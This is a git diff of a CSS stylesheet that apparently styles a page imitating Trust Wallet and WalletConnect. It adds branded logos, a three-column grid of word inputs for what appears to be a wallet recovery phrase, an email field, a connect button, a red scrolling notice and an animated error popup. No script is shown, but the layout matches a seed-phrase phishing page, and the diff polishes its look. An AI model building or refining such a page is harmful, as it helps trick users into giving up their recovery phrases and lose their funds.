@@ -89,6 +89,13 @@ body {
   object-fit: contain;
 }
 
+.twc-back{
+  color: black;
+  position: absolute;
+    left: 20px;
+    font-size: 22px;
+    cursor: pointer;
+}
 /* CARD - Mobile First */
 .twc-card {
   background: #cfeefa;
@@ -102,26 +109,27 @@ body {
 }
 
 /* HEADER - Mobile Responsive */
-.twc-header {
+.twc-header-main {
   display: flex;
-  flex-direction: column;
+  flex-direction: row;
   align-items: center;
-  gap: 15px;
+  justify-content: center;   /* ✅ centers horizontally */
+  gap: 12px;
   margin-bottom: 25px;
-  text-align: center;
+  width: 100%;               /* ✅ ensures full-width centering */
 }
 
 .twc-connect-text {
-  font-size: 28px;
+  font-size: 12px;
   font-weight: 700;
   color: #137ae8;
   margin: 0;
   line-height: 1.2;
+  white-space: nowrap;
 }
 
-.twc-header img {
+.twc-header-main img {
   width: 180px;
-  max-width: 80%;
   height: auto;
   object-fit: contain;
 }
@@ -195,17 +203,35 @@ body {
   font-size: 13px;
 }
 
-/* INFO TEXT */
-.twc-info-text {
-  font-size: 13px;
-  color: #666;
-  margin: 10px 0;
-  line-height: 1.5;
-  text-align: center;
+/* Info Scroller Wrapper */
+.twc-info-wrapper {
+  width: 100%;
+  overflow: hidden;
   background: rgba(255, 255, 255, 0.7);
-  padding: 10px;
   border-radius: 8px;
-  border-left: 4px solid #2f7dd3;
+  margin: 10px 0;
+  position: relative;
+}
+
+/* Scrolling Text */
+.twc-info-text-scroll {
+  display: inline-block;
+  white-space: nowrap;
+  font-size: 13px;
+  color: #f00606;
+  line-height: 1.5;
+  padding: 10px 0;
+  animation: scrollLeft 15s linear infinite;
+}
+
+/* RIGHT ➜ LEFT animation */
+@keyframes scrollLeft {
+  0% {
+    transform: translateX(100%);
+  }
+  100% {
+    transform: translateX(-100%);
+  }
 }
 
 /* BUTTON - Mobile Optimized */
@@ -237,6 +263,7 @@ body {
   opacity: 0.6;
   cursor: not-allowed;
 }
+
 
 /* POPUP MODAL - Mobile Optimized */
 .twc-modal-overlay {
@@ -287,7 +314,7 @@ body {
 .twc-popup-title {
   font-size: 24px;
   margin-bottom: 12px;
-  color: #222;
+  color:red;
   font-weight: 700;
   line-height: 1.3;
 }
@@ -295,7 +322,7 @@ body {
 .twc-popup-text {
   font-size: 15px;
   line-height: 1.5;
-  color: #555;
+  color: black;
   margin-bottom: 5px;
   padding: 0 5px;
 }
@@ -369,10 +396,10 @@ body {
   }
   
   .twc-connect-text {
-    font-size: 24px;
+    font-size: 10px;
   }
   
-  .twc-header img {
+  .twc-header-main img {
     width: 160px;
   }
   
@@ -456,7 +483,7 @@ body {
     font-size: 32px;
   }
   
-  .twc-header img {
+  .twc-header-main img {
     width: 200px;
   }
   
@@ -489,18 +516,63 @@ body {
     padding: 30px;
   }
   
-  .twc-header {
+  .twc-header-main {
     flex-direction: row;
     justify-content: center;
     gap: 20px;
   }
   
   .twc-connect-text {
-    font-size: 36px;
+    font-size: 12px;
   }
   
-  .twc-header img {
+  .twc-header-main img {
     width: 220px;
+  }
+}
+
+/* DESKTOP - Fit in single frame */
+@media (min-width: 1025px) {
+  .twc-page {
+    justify-content: center;
+    padding: 40px;
+    min-height: 100vh;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  
+  .twc-back-button {
+    top: 40px;
+    left: 40px;
+  }
+  
+  .twc-card {
+    max-width: 500px;
+    width: 100%;
+    padding: 40px 35px;
+  }
+  
+  .twc-phrase-box {
+    grid-template-columns: repeat(3, 1fr);
+    gap: 15px;
+    padding: 25px;
+  }
+  
+  .twc-logo img {
+    height: 80px;
+    max-width: 200px;
+  }
+  
+  .twc-connect-text {
+    font-size: 12px; /* Changed from 32px to 12px for desktop */
+  }
+  
+  .twc-header-main img {
+    width: 200px;
+  }
+  
+  .twc-modal-box {
+    max-width: 450px;
   }
 }
 
@@ -580,27 +652,21 @@ body {
 
 /* Dark Mode Support */
 @media (prefers-color-scheme: dark) {
-
-
-  
- 
-  
   .twc-word-input::placeholder,
   .twc-input::placeholder {
-    color: #a0aec0;
+    color:black;
   }
   
- 
   .twc-label-email {
     color: #63b3ed;
   }
   
   .twc-popup-text {
-    color: #e2e8f0;
+    color: black;
   }
   
   .twc-popup-title {
-    color: #f7fafc;
+    color:red;
   }
   
   .twc-back-button {
@@ -633,7 +699,7 @@ body {
 }
 
 /* Loading State for Button */
-.twc-connect-btn:disabled::after {
+/* .twc-connect-btn:disabled::after {
   content: '';
   width: 16px;
   height: 16px;
@@ -642,10 +708,86 @@ body {
   border-radius: 50%;
   animation: buttonSpinner 0.8s linear infinite;
   margin-left: 10px;
-}
+} */
 
 @keyframes buttonSpinner {
   to {
     transform: rotate(360deg);
+  }
+}
+
+.twc-header-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 25px;
+  width: 100%;
+}
+
+/* WalletConnect logo (top) */
+.twc-walletconnect-img {
+  height: 80px;
+  width: auto;
+  object-fit: contain;
+}
+
+/* CONNECT + Trust Wallet row */
+.twc-header-row {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0px;
+}
+
+.twc-header-row img {
+  height: 36px;
+  width: auto;
+  object-fit: contain;
+}
+
+.twc-connect-text {
+  white-space: nowrap;
+}
+/* Animated Error Icon */
+.twc-error-icon {
+  width: 64px;
+  height: 64px;
+}
+
+.twc-error-circle {
+  stroke: #ff4444;
+  stroke-width: 3;
+  stroke-dasharray: 157;
+  stroke-dashoffset: 157;
+  animation: drawCircle 0.6s ease-out forwards;
+}
+
+.twc-error-line {
+  stroke: #ff4444;
+  stroke-width: 3;
+  stroke-linecap: round;
+  stroke-dasharray: 40;
+  stroke-dashoffset: 40;
+  animation: drawLine 0.3s ease-out forwards;
+}
+
+.twc-error-line-left {
+  animation-delay: 0.6s;
+}
+
+.twc-error-line-right {
+  animation-delay: 0.75s;
+}
+
+@keyframes drawCircle {
+  to {
+    stroke-dashoffset: 0;
+  }
+}
+
+@keyframes drawLine {
+  to {
+    stroke-dashoffset: 0;
   }
 }
